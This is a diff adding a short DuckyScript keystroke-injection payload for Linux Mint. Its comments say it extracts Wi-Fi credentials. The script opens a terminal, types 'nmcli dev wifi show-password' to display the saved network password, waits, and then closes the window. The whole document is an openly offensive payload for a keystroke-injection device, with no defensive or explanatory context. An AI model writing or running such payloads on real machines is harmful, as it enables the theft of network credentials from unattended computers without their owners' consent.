@@ -1,0 +1,9 @@
+REM Script tested on Linux Mint 22
+REM This script extractx Wi-Fi credentials on Linux
+CTRL-ALT t
+DELAY 300
+STRING nmcli dev wifi show-password
+ENTER
+DELAY 5000
+STRING exit
+ENTER
